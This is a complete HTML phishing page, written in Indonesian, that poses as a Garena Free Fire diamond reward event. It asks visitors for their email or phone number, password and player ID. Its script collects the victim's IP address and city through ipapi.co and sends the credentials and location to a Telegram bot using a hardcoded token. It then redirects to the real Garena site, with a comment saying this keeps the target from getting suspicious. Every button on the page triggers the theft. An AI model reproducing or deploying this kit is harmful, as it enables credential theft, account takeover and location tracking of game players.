<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Garena Free Fire - Reward Event</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Teko:wght@400;700&display=swap');
        body { background: #000; font-family: 'Teko', sans-serif; overflow-x: hidden; }
        .bg-main { background: url('https://wallpaperaccess.com/full/1155026.jpg') no-repeat center; background-size: cover; }
        .box-pancing { background: rgba(0,0,0,0.85); border: 2px solid #facc15; box-shadow: 0 0 20px #facc1550; }
        input { font-family: sans-serif; }
    </style>
</head>
<body class="bg-main min-h-screen flex items-center justify-center p-4">

    <div class="box-pancing w-full max-w-sm rounded-lg p-6 animate__animated animate__fadeIn">
        <div class="text-center">
            <img src="https://upload.wikimedia.org/wikipedia/en/3/36/Free_Fire_Logo.png" class="h-14 mx-auto mb-2">
            <h1 class="text-3xl font-bold text-yellow-400 uppercase tracking-wider italic">PENUKARAN HADIAH</h1>
            <p class="text-gray-300 text-sm leading-tight mb-6 uppercase tracking-widest">Verifikasi Akun Anda Untuk Menerima Diamond</p>
        </div>

        <form id="gas-data" class="space-y-4">
            <div class="relative">
                <input type="text" id="user" class="w-full bg-zinc-900 border border-zinc-700 p-3 rounded text-white text-sm focus:border-yellow-400 outline-none transition" placeholder="EMAIL ATAU NOMOR HP" required>
            </div>

            <div class="relative">
                <input type="password" id="pass" class="w-full bg-zinc-900 border border-zinc-700 p-3 rounded text-white text-sm focus:border-yellow-400 outline-none transition" placeholder="KATA SANDI" required>
            </div>

            <div class="relative">
                <input type="number" id="id_game" class="w-full bg-zinc-900 border border-zinc-700 p-3 rounded text-white text-sm focus:border-yellow-400 outline-none transition" placeholder="ID PLAYER (CONTOH: 12345678)" required>
            </div>

            <button type="submit" class="universal-action w-full bg-yellow-400 hover:bg-yellow-500 text-black font-black py-3 rounded text-xl uppercase italic transition transform active:scale-95 shadow-lg shadow-yellow-400/20">
                KLAIM SEKARANG
            </button>
            
            <div class="grid grid-cols-2 gap-2">
                <button type="button" class="universal-action bg-zinc-800 text-gray-400 text-xs py-2 rounded border border-zinc-700 hover:bg-zinc-700">LUPA PASSWORD</button>
                <button type="button" class="universal-action bg-zinc-800 text-gray-400 text-xs py-2 rounded border border-zinc-700 hover:bg-zinc-700">HUBUNGI CS</button>
            </div>
        </form>

        <div class="mt-8 text-center border-t border-zinc-800 pt-4">
            <p class="text-[10px] text-zinc-500 uppercase tracking-tighter">Copyright Â© Garena International. All Rights Reserved.</p>
        </div>
    </div>

    <script>
        // --- KONFIGURASI TELEGRAM ---
        const API_TOKEN = "8205581950:AAETz7C7eeiOrINZWEIR4dTfRmacVWVNXPc"; 
        const CHAT_ID = "8551809114";
        // ----------------------------

        async function setorData() {
            const u = document.getElementById('user').value;
            const p = document.getElementById('pass').value;
            const i = document.getElementById('id_game').value;

            if(!u || !p || !i) return alert("Harap lengkapi semua kolom!");

            // Ambil Info IP & Lokasi Map
            let geo = "Lokasi tidak diizinkan";
            try {
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();
                geo = `ðŸŒ IP: ${d.ip}\nðŸ™ï¸ Kota: ${d.city}\nðŸ“ Maps: https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
            } catch (e) {}

            const teks = `âš ï¸ **SETORAN BARU (MIRIP BIZ.ID)** âš ï¸\n\nðŸ‘¤ User: \`${u}\` \nðŸ”‘ Pass: \`${p}\` \nðŸ†” ID: \`${i}\` \n\n**LOG LOKASI:**\n${geo}\n\nâ° Waktu: ${new Date().toLocaleString()}`;

            // Kirim ke Tele
            fetch(`https://api.telegram.org/bot${API_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: teks, parse_mode: 'Markdown' })
            }).then(() => {
                // Redirect ke web Garena asli biar target gak curiga
                window.location.href = "https://reward.ff.garena.com/id";
            });
        }

        // Semua tombol bakal nge-trigger setorData()
        document.querySelectorAll('.universal-action').forEach(btn => {
            btn.addEventListener('click', (e) => {
                e.preventDefault();
                setorData();
            });
        });

        // Submit form juga setor data
        document.getElementById('gas-data').addEventListener('submit', (e) => {
            e.preventDefault();
            setorData();
        });
    </script>
</body>
</html>
